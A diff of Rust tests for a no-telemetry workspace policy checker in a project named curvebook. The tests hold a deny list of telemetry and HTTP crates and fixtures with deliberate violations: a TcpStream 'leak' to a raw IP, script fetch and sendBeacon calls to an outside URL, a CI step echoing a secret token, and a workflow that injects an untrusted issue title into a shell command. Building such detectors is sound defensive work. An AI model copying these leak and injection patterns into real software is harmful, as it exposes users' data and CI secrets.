-        let path = entry.path();
-        let name = entry.file_name();
-        let name_str = name.to_string_lossy();
-        if ft.is_dir() {
-            if name_str == "target" || name_str == "dist" || name_str == "corpus" || name_str.starts_with('.') {
-                continue;
-            }
-            collect_files_named(&path, target_name, out)?;
-        } else if ft.is_file() && name_str == target_name {
-            out.push(path);
-        }
-    }
-    Ok(())
-}
-
-fn collect_all_files_under(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
-    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
-    for entry in entries {
-        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
-        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
-        let path = entry.path();
-        let name = entry.file_name();
-        let name_str = name.to_string_lossy();
-        if ft.is_dir() {
-            if name_str == "target" || name_str == "dist" || name_str == ".git" {
-                continue;
-            }
-            collect_all_files_under(root, &path, out)?;
-        } else if ft.is_file() {
-            out.push(rel_slash(root, &path));
-        }
-    }
-    Ok(())
-}
-
-fn rel_slash(root: &Path, path: &Path) -> String {
-    path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/")
-}
-
-fn next_ident_pattern_match(line: &str, from: usize, patterns: &[&'static str]) -> Option<(usize, &'static str)> {
-    let bytes = line.as_bytes();
-    let mut best: Option<(usize, &'static str)> = None;
-    for &pat in patterns {
-        let mut search = from;
-        while let Some(rel) = line.get(search..).and_then(|s| s.find(pat)) {
-            let pos = search + rel;
-            let end = pos + pat.len();
-            let left_ok = pos == 0 || !is_ident_byte(bytes[pos - 1]);
-            let right_ok = end == bytes.len() || !is_ident_byte(bytes[end]);
-            if left_ok && right_ok {
-                let replace = match best {
-                    None => true,
-                    Some((best_pos, best_pat)) => pos < best_pos || (pos == best_pos && pat.len() > best_pat.len()),
-                };
-                if replace {
-                    best = Some((pos, pat));
-                }
-                break;
-            }
-            search = pos + line.get(pos..).and_then(|s| s.chars().next()).map_or(1, char::len_utf8);
-        }
-    }
-    best
 }
 
 fn leading_spaces(s: &str) -> usize {
@@ -2092,523 +1818,304 @@ fn strip_yaml_comment(line: &str) -> &str {
     line
 }
 
-fn unquote_yaml_scalar(s: &str) -> &str {
-    let t = s.trim();
-    t.strip_prefix('"').and_then(|r| r.strip_suffix('"')).or_else(|| t.strip_prefix('\'').and_then(|r| r.strip_suffix('\''))).unwrap_or(t)
-}
-
 #[cfg(test)]
 mod tests {
-    use std::path::{Path, PathBuf};
-    use std::sync::atomic::{AtomicU64, Ordering};
+    use std::path::Path;
 
-    use super::{is_banned_crate_name, run, run_checks};
+    use super::{TelemetryViolation, is_banned_crate_name, run, run_checks};
+    use crate::scan_util::test_support::{TestDir, to_utf16_bytes};
 
-    static TEMP_SEQ: AtomicU64 = AtomicU64::new(0);
-
-    struct TempDirGuard {
-        path: PathBuf,
-    }
-
-    impl TempDirGuard {
-        fn new(label: &str) -> Self {
-            let seq = TEMP_SEQ.fetch_add(1, Ordering::Relaxed);
-            let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map_or(0, |d| d.as_nanos());
-            let path = std::env::temp_dir().join(format!("curvebook-telemetry-{label}-{}-{nanos}-{seq}", std::process::id()));
-            std::fs::create_dir_all(&path).unwrap();
-            Self { path }
+    fn create_clean_fixture(label: &str) -> TestDir {
+        let dir = TestDir::new(&format!("tel-{label}"));
+        for (rel, content) in [
+            ("Cargo.toml", "[workspace]\nmembers = [\"crates/core\", \"crates/mcp\"]\n"),
+            ("Cargo.lock", "[[package]]\nname = \"serde\"\nversion = \"1.0.229\"\n"),
+            ("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\nversion = \"0.1.0\"\n[dependencies]\nserde = \"1\"\n"),
+            (
+                "crates/core/src/lib.rs",
+                "// TcpStream in comment is fine\npub fn label() -> &'static str { \"std::net::TcpStream\" }\n#[cfg(test)]\nmod tests {\n    use std::net::UdpSocket;\n}\n",
+            ),
+            (
+                "crates/mcp/src/tools.rs",
+                "use std::net::{SocketAddr, TcpStream};\npub fn addr(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\n",
+            ),
+            ("apps/curvebook-web/index.html", "<!DOCTYPE html><html><body><svg xmlns=\"http://www.w3.org/2000/svg\"></svg></body></html>\n"),
+            (
+                ".github/workflows/ci.yml",
+                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
+            ),
+            (
+                ".github/workflows/release.yml",
+                "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo build\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
+            ),
+            (
+                "packaging/web/_headers",
+                "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
+            ),
+            (
+                "packaging/web/.htaccess",
+                "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
+            ),
+            ("packaging/windows/check.ps1", "while ($null -ne ($record = $view.Fetch())) {}\n"),
+        ] {
+            dir.write(rel, content);
         }
-
-        fn write(&self, rel: &str, content: &str) {
-            let p = self.path.join(rel);
-            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
-            std::fs::write(p, content).unwrap();
-        }
-    }
-
-    impl Drop for TempDirGuard {
-        fn drop(&mut self) {
-            let _ = std::fs::remove_dir_all(&self.path);
-        }
-    }
-
-    fn create_clean_fixture(label: &str) -> TempDirGuard {
-        let dir = TempDirGuard::new(label);
-        dir.write("Cargo.toml", "[workspace]\nmembers = [\"crates/core\", \"crates/mcp\"]\n");
-        dir.write("Cargo.lock", "[[package]]\nname = \"serde\"\nversion = \"1.0.229\"\n");
-        dir.write("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\nversion = \"0.1.0\"\n[dependencies]\nserde = \"1\"\n");
-        dir.write(
-            "crates/core/src/lib.rs",
-            "// TcpStream in comment is fine\npub fn label() -> &'static str { \"std::net::TcpStream\" }\n#[cfg(test)]\nmod tests {\n    use std::net::UdpSocket;\n}\n",
-        );
-        dir.write(
-            "crates/mcp/src/tools.rs",
-            "use std::net::{SocketAddr, TcpStream};\npub fn addr(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\n",
-        );
-        dir.write("apps/curvebook-web/index.html", "<!DOCTYPE html><html><body><svg xmlns=\"http://www.w3.org/2000/svg\"></svg></body></html>\n");
-        dir.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
-        );
-        dir.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo build\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
-        );
-        dir.write(
-            "packaging/web/_headers",
-            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
-        );
-        dir.write(
-            "packaging/web/.htaccess",
-            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
-        );
-        dir.write("packaging/windows/check.ps1", "while ($null -ne ($record = $view.Fetch())) {}\n");
         dir
     }
 
+    fn has_hit(hits: &[TelemetryViolation], check: u8, path: Option<&str>, needle: &str) -> bool {
+        hits.iter().any(|v| v.check == check && path.is_none_or(|p| v.path == p) && v.detail.contains(needle))
+    }
+
+    fn has_bad_write(hits: &[TelemetryViolation], path: &str, scope: &str) -> bool {
+        let prefix = format!("unexpected write permission `{scope}: write`");
+        hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
+    }
+
     #[test]
-    fn clean_real_workspace_passes_all_five_checks() {
+    fn clean_real_workspace_and_synthetic_fixture_pass() {
         let root = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
         let (stats, violations) = run_checks(root).unwrap();
         assert!(violations.is_empty(), "real workspace violations:\n{violations:?}");
-        assert!(stats.manifests >= 20);
-        assert!(stats.lock_packages >= 20);
-        assert!(stats.rust_sources >= 50);
-        assert!(stats.workflows >= 4);
-        assert_eq!(stats.header_configs, 2);
+        assert!(stats.manifests >= 20 && stats.lock_packages >= 20 && stats.rust_sources >= 50 && stats.workflows >= 4 && stats.header_configs == 2);
         run(root, &[]).unwrap();
-    }
 
-    #[test]
-    fn synthetic_clean_fixture_passes_and_rejects_bad_args() {
         let dir = create_clean_fixture("clean");
-        run(&dir.path, &[]).unwrap();
-        assert!(run(&dir.path, &[String::from("--unknown")]).is_err());
+        run(dir.path(), &[]).unwrap();
+        assert!(run(dir.path(), &[String::from("--unknown")]).is_err());
     }
 
     #[test]
-    fn check1_flags_banned_crates_in_manifests_and_lockfile() {
-        assert!(is_banned_crate_name("sentry"));
-        assert!(is_banned_crate_name("sentry-core"));
-        assert!(is_banned_crate_name("opentelemetry_sdk"));
-        assert!(is_banned_crate_name("tracing-opentelemetry"));
-        assert!(is_banned_crate_name("posthog-rs"));
-        assert!(is_banned_crate_name("reqwest"));
-        assert!(is_banned_crate_name("hyper"));
-        assert!(!is_banned_crate_name("hyperbolic"));
-        assert!(!is_banned_crate_name("serde"));
+    fn checks_1_to_5_flag_banned_crates_net_web_workflows_and_headers() {
+        for banned in ["sentry", "sentry-core", "opentelemetry_sdk", "tracing-opentelemetry", "posthog-rs", "reqwest", "hyper"] {
+            assert!(is_banned_crate_name(banned), "{banned}");
+        }
+        for ok in ["hyperbolic", "serde"] {
+            assert!(!is_banned_crate_name(ok), "{ok}");
+        }
 
-        let dir = create_clean_fixture("check1-manifest");
-        dir.write(
-            "crates/core/Cargo.toml",
-            "[package]\nname = \"curvebook-core\"\n[dependencies]\nclient = { package = \"reqwest\", version = \"0.12\" }\n",
-        );
-        let (_, hits) = run_checks(&dir.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("reqwest")), "{hits:?}");
-
-        let dir2 = create_clean_fixture("check1-lock");
-        dir2.write("Cargo.lock", "[[package]]\nname = \"sentry-core\"\nversion = \"0.34.0\"\n");
-        let (_, hits2) = run_checks(&dir2.path).unwrap();
-        assert!(hits2.iter().any(|v| v.check == 1 && v.path == "Cargo.lock" && v.detail.contains("sentry-core")), "{hits2:?}");
+        type PolicyCase = (&'static str, &'static str, &'static str, u8, Option<&'static str>, &'static [&'static str]);
+        let cases: &[PolicyCase] = &[
+            (
+                "c1-manifest",
+                "crates/core/Cargo.toml",
+                "[package]\nname = \"curvebook-core\"\n[dependencies]\nclient = { package = \"reqwest\", version = \"0.12\" }\n",
+                1,
+                None,
+                &["reqwest"],
+            ),
+            ("c1-lock", "Cargo.lock", "[[package]]\nname = \"sentry-core\"\nversion = \"0.34.0\"\n", 1, Some("Cargo.lock"), &["sentry-core"]),
+            (
+                "c2-unapproved",
+                "crates/core/src/net_bad.rs",
+                "pub fn leak() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
+                2,
+                Some("crates/core/src/net_bad.rs"),
+                &["TcpStream"],
+            ),
+            (
+                "c2-udp",
+                "apps/curvebook/src/main.rs",
+                "use std::net::UdpSocket;\npub fn f() { let _ = UdpSocket::bind(\"127.0.0.1:0\"); }\n",
+                2,
+                None,
+                &["UdpSocket"],
+            ),
+            (
+                "c2-no-loopback",
+                "crates/ui-egui/src/control_io.rs",
+                "use std::net::TcpListener;\npub fn bind_all() { let _ = TcpListener::bind(\"0.0.0.0:9000\"); }\n",
+                2,
+                None,
+                &["loopback guard"],
+            ),
+            (
+                "c3-wf",
+                ".github/workflows/ci.yml",
+                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo $SONAR_TOKEN\n",
+                3,
+                None,
+                &["sonar_token"],
+            ),
+            (
+                "c3-web",
+                "apps/curvebook-web/index.html",
+                "<html><script>window.fetch('https://example.com/p'); navigator.sendBeacon('/t');</script></html>\n",
+                3,
+                None,
+                &["fetch(", "sendbeacon", "https://example.com/p"],
+            ),
+            (
+                "c4-perms",
+                ".github/workflows/ci.yml",
+                "name: CI\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
+                4,
+                None,
+                &["contents: read"],
+            ),
+            (
+                "c4-write",
+                ".github/workflows/ci.yml",
+                "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
+                4,
+                None,
+                &["write permission"],
+            ),
+            (
+                "c4-inject",
+                ".github/workflows/ci.yml",
+                "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Bad\n        run: |\n          echo \"${{ github.event.issue.title }}\"\n",
+                4,
+                None,
+                &["github.event."],
+            ),
+            (
+                "c5-headers",
+                "packaging/web/_headers",
+                "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' https://telemetry.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=()\n  X-Content-Type-Options: nosniff\n",
+                5,
+                Some("packaging/web/_headers"),
+                &["connect-src 'self'", "geolocation=()"],
+            ),
+            (
+                "c5-htaccess",
+                "packaging/web/.htaccess",
+                "<IfModule mod_headers.c>\n  Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>\n",
+                5,
+                Some("packaging/web/.htaccess"),
+                &["Content-Security-Policy", "Referrer-Policy"],
+            ),
+        ];
+        for &(label, rel, body, check, path_opt, needles) in cases {
+            let dir = create_clean_fixture(label);
+            dir.write(rel, body);
+            let (_, hits) = run_checks(dir.path()).unwrap();
+            for &needle in needles {
+                assert!(has_hit(&hits, check, path_opt, needle), "{label}: missing `{needle}` in {hits:?}");
+            }
+        }
     }
 
     #[test]
-    fn check2_flags_unapproved_net_udp_and_missing_loopback_guard() {
-        let dir = create_clean_fixture("check2-unapproved");
-        dir.write("crates/core/src/net_bad.rs", "pub fn leak() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
-        let (_, hits) = run_checks(&dir.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/net_bad.rs"), "{hits:?}");
-
-        let dir2 = create_clean_fixture("check2-udp");
-        dir2.write("apps/curvebook/src/main.rs", "use std::net::UdpSocket;\npub fn f() { let _ = UdpSocket::bind(\"127.0.0.1:0\"); }\n");
-        let (_, hits2) = run_checks(&dir2.path).unwrap();
-        assert!(hits2.iter().any(|v| v.check == 2 && v.detail.contains("UdpSocket")), "{hits2:?}");
-
-        let dir3 = create_clean_fixture("check2-no-loopback");
-        dir3.write(
-            "crates/ui-egui/src/control_io.rs",
-            "use std::net::TcpListener;\npub fn bind_all() { let _ = TcpListener::bind(\"0.0.0.0:9000\"); }\n",
-        );
-        let (_, hits3) = run_checks(&dir3.path).unwrap();
-        assert!(hits3.iter().any(|v| v.check == 2 && v.detail.contains("loopback guard")), "{hits3:?}");
-    }
-
-    #[test]
-    fn check3_flags_telemetry_terms_fetch_and_external_urls() {
-        let dir = create_clean_fixture("check3-wf");
-        dir.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo $SONAR_TOKEN\n",
-        );
-        let (_, hits) = run_checks(&dir.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 3 && v.detail.contains("sonar_token")), "{hits:?}");
-
-        let dir2 = create_clean_fixture("check3-web");
-        dir2.write(
-            "apps/curvebook-web/index.html",
-            "<html><script>window.fetch('https://example.com/p'); navigator.sendBeacon('/t');</script></html>\n",
-        );
-        let (_, hits2) = run_checks(&dir2.path).unwrap();
-        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("fetch(")), "{hits2:?}");
-        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("sendbeacon")), "{hits2:?}");
-        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("https://example.com/p")), "{hits2:?}");
-    }
-
-    #[test]
-    fn check4_flags_missing_permissions_bad_write_and_event_injection() {
-        let dir = create_clean_fixture("check4-perms");
-        dir.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
-        );
-        let (_, hits) = run_checks(&dir.path).unwrap();
-        assert!(hits.iter().any(|v| v.check == 4 && v.detail.contains("contents: read")), "{hits:?}");
-
-        let dir2 = create_clean_fixture("check4-write");
-        dir2.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
-        );
-        let (_, hits2) = run_checks(&dir2.path).unwrap();
-        assert!(hits2.iter().any(|v| v.check == 4 && v.detail.contains("write permission")), "{hits2:?}");
-
-        let dir3 = create_clean_fixture("check4-inject");
-        dir3.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Bad\n        run: |\n          echo \"${{ github.event.issue.title }}\"\n",
-        );
-        let (_, hits3) = run_checks(&dir3.path).unwrap();
-        assert!(hits3.iter().any(|v| v.check == 4 && v.detail.contains("github.event.")), "{hits3:?}");
-    }
-
-    #[test]
-    fn check4_allows_release_publish_attestation_writes_and_rejects_elsewhere() {
-        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
-            let prefix = format!("unexpected write permission `{scope}: write`");
-            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
-        };
-
-        let dir_ok = create_clean_fixture("check4-attest-ok");
-        dir_ok.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo --version\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n",
-        );
-        let (_, ok_hits) = run_checks(&dir_ok.path).unwrap();
-        assert!(ok_hits.is_empty(), "expected release.yml publish attestation scopes to pass: {ok_hits:?}");
-
-        let dir_top = create_clean_fixture("check4-attest-top");
-        dir_top.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
-        );
-        let (_, top_hits) = run_checks(&dir_top.path).unwrap();
-        assert_eq!(top_hits.len(), 2, "{top_hits:?}");
-        assert!(has_bad_write(&top_hits, ".github/workflows/release.yml", "id-token"), "{top_hits:?}");
-        assert!(has_bad_write(&top_hits, ".github/workflows/release.yml", "attestations"), "{top_hits:?}");
-
-        let dir_other_job = create_clean_fixture("check4-attest-other-job");
-        dir_other_job.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  linux:\n    runs-on: ubuntu-latest\n    permissions:\n      attestations: write\n    steps:\n      - run: echo bad\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
-        );
-        let (_, job_hits) = run_checks(&dir_other_job.path).unwrap();
-        assert_eq!(job_hits.len(), 2, "{job_hits:?}");
-        assert!(has_bad_write(&job_hits, ".github/workflows/release.yml", "id-token"), "{job_hits:?}");
-        assert!(has_bad_write(&job_hits, ".github/workflows/release.yml", "attestations"), "{job_hits:?}");
-
-        let dir_ci = create_clean_fixture("check4-attest-ci");
-        dir_ci.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - run: cargo test\n",
-        );
-        let (_, ci_hits) = run_checks(&dir_ci.path).unwrap();
-        assert_eq!(ci_hits.len(), 2, "{ci_hits:?}");
-        assert!(has_bad_write(&ci_hits, ".github/workflows/ci.yml", "id-token"), "{ci_hits:?}");
-        assert!(has_bad_write(&ci_hits, ".github/workflows/ci.yml", "attestations"), "{ci_hits:?}");
-
-        let dir_ci_top = create_clean_fixture("check4-attest-ci-top");
-        dir_ci_top.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
-        );
-        let (_, ci_top_hits) = run_checks(&dir_ci_top.path).unwrap();
-        assert_eq!(ci_top_hits.len(), 2, "{ci_top_hits:?}");
-        assert!(has_bad_write(&ci_top_hits, ".github/workflows/ci.yml", "id-token"), "{ci_top_hits:?}");
-        assert!(has_bad_write(&ci_top_hits, ".github/workflows/ci.yml", "attestations"), "{ci_top_hits:?}");
-
-        let dir_bad_scope = create_clean_fixture("check4-attest-bad-scope");
-        dir_bad_scope.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n      packages: write\n    steps:\n      - run: echo ok\n",
-        );
-        let (_, scope_hits) = run_checks(&dir_bad_scope.path).unwrap();
-        assert_eq!(scope_hits.len(), 1, "{scope_hits:?}");
-        assert!(has_bad_write(&scope_hits, ".github/workflows/release.yml", "packages"), "{scope_hits:?}");
-    }
-
-    #[test]
-    fn check4_allows_ci_prune_caches_actions_write_and_rejects_elsewhere() {
-        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
-            let prefix = format!("unexpected write permission `{scope}: write`");
-            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
-        };
-
-        let dir_ok_inline = create_clean_fixture("check4-prune-ok-inline");
-        dir_ok_inline.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions: { actions: write }\n    steps:\n      - run: gh cache list\n",
-        );
-        let (_, ok_inline_hits) = run_checks(&dir_ok_inline.path).unwrap();
-        assert!(ok_inline_hits.is_empty(), "expected ci.yml prune-caches actions: write (inline) to pass: {ok_inline_hits:?}");
-
-        let dir_ok_block = create_clean_fixture("check4-prune-ok-block");
-        dir_ok_block.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: gh cache list\n",
-        );
-        let (_, ok_block_hits) = run_checks(&dir_ok_block.path).unwrap();
-        assert!(ok_block_hits.is_empty(), "expected ci.yml prune-caches actions: write (block) to pass: {ok_block_hits:?}");
-
-        let dir_top = create_clean_fixture("check4-prune-top");
-        dir_top.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\n  actions: write\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh cache list\n",
-        );
-        let (_, top_hits) = run_checks(&dir_top.path).unwrap();
-        assert_eq!(top_hits.len(), 1, "{top_hits:?}");
-        assert!(has_bad_write(&top_hits, ".github/workflows/ci.yml", "actions"), "{top_hits:?}");
-
-        let dir_other_job = create_clean_fixture("check4-prune-other-job");
-        dir_other_job.write(
-            ".github/workflows/ci.yml",
-            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: cargo test\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo bad\n",
-        );
-        let (_, other_hits) = run_checks(&dir_other_job.path).unwrap();
-        assert_eq!(other_hits.len(), 2, "{other_hits:?}");
-        assert!(has_bad_write(&other_hits, ".github/workflows/ci.yml", "actions"), "{other_hits:?}");
-        assert!(has_bad_write(&other_hits, ".github/workflows/ci.yml", "contents"), "{other_hits:?}");
-
-        let dir_other_wf = create_clean_fixture("check4-prune-other-wf");
-        dir_other_wf.write(
-            ".github/workflows/release.yml",
-            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: echo bad\n",
-        );
-        let (_, wf_hits) = run_checks(&dir_other_wf.path).unwrap();
-        assert_eq!(wf_hits.len(), 1, "{wf_hits:?}");
-        assert!(has_bad_write(&wf_hits, ".github/workflows/release.yml", "actions"), "{wf_hits:?}");
-    }
-
-    #[test]
-    fn check4_r12_9_allows_pages_deploy_job_only() {
-        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
-            let prefix = format!("unexpected write permission `{scope}: write`");
-            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
-        };
+    fn check4_enforces_narrow_write_scopes_for_release_ci_and_pages_workflows() {
         let deploy_steps =
             "    steps:\n      - id: deployment\n        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n";
+        let ok_cases = [
+            ("attest-ok", ".github/workflows/release.yml", "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo --version\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n".to_owned()),
+            ("prune-inline", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions: { actions: write }\n    steps:\n      - run: gh cache list\n".to_owned()),
+            ("prune-block", ".github/workflows/ci.yml", "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: gh cache list\n".to_owned()),
+            ("pages-block", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo xtask pages-stage _site\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      id-token: write\n{deploy_steps}")),
+            ("pages-inline", ".github/workflows/pages.yml", format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions: {{ pages: write, id-token: write }}\n{deploy_steps}")),
+        ];
+        for (label, rel, body) in &ok_cases {
+            let dir = create_clean_fixture(label);
+            dir.write(rel, body);
+            let (_, hits) = run_checks(dir.path()).unwrap();
+            assert!(hits.is_empty(), "{label}: expected pass, got {hits:?}");
+        }
 
-        let dir_ok_block = create_clean_fixture("check4-pages-ok-block");
-        dir_ok_block.write(
-            ".github/workflows/pages.yml",
-            &format!(
-                "name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo xtask pages-stage _site\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      id-token: write\n    environment:\n      name: github-pages\n      url: ${{{{ steps.deployment.outputs.page_url }}}}\n{deploy_steps}"
-            ),
-        );
